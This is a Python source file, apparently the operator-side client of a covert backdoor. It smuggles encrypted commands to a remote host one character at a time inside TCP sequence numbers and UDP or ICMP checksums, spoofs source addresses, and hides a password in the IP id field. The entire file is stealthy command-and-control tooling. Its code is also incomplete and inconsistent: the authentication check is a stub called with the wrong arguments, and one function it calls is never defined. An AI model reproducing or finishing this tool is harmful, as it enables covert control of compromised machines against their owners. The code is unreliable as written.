import socket
from scapy.all import *
from struct import *
import sys
import threading
import pcapy
import config
import client
import utils

server = ""
protocol = ""
interface = ""

def startClient(serverIP, proto, intf):
	# check if you can connect?
	# start the recieving thread
	global server
	global protocol
	global interface

	server = serverIP
	protocol = proto
	interface = intf

	listenThread = threading.Thread(target=recvThread)
	listenThread.daemon = True
	listenThread.start()

	# wait for commands
	while(client.running):
		comm = getCommand()
		if comm != "":
			sendCommand(utils.encryptData(comm))
		else:
			client.running = False
			sys.exit()

def sendCommand(command):
	# send your command, make sure you set the password in the ip id field (ipHeader[3])
	pswd = utils.encrypt(config.password)

	for c in command:
		packet = IP(dst=server, src=RandIP(), id=pswd)
		if protocol == 'tcp':
			proto = TCP(dport=RandNum(1024, 65535), sport=RandNum(1024, 65535), seq=ord(c))
		elif protocol == 'udp':
			proto = UDP(dport=RandNum(1024, 65535), sport=RandNum(1024, 65535), chksum=ord(c))
		elif protocol == 'icmp':
			proto = ICMP(chksum=ord(c))
		packet = packet/proto
		send(packet)

	send(IP(dst=server, id=pswd)/TCP(dport=RandNum(1024, 65535), sport=RandNum(1024, 65535), seq=15))


def recvThread():
	# wait for the knock code
	# once you get the knock code, send something back, then begin listening for stuff
	# for now, just print data
	cap = pcapy.open_live(interface, 65536, 1, 0)
	fltr = "ip src " + server
	cap.setfilter(fltr)

	while(client.running):
		(header, packet) = cap.next()
		packetHandler(packet)

def authenticated():
	# start a timer, or check if it's running
		# if the timer expired, no auth
	# if it fits the knock code, add one to a value
	# if the value == to the total knock code, authenticate
	return True

def packetHandler(packet):
	if authenticated(packet):
		pacType = utils.checkType(packet)
		ip, protoH, data = utils.stripPacket(packet, pacType)
		checkCommand(ip, protoH, data, pacType)

def getCommand():
	try: 
		comm = raw_input()
	except KeyboardInterrupt:
		return ""
	return comm
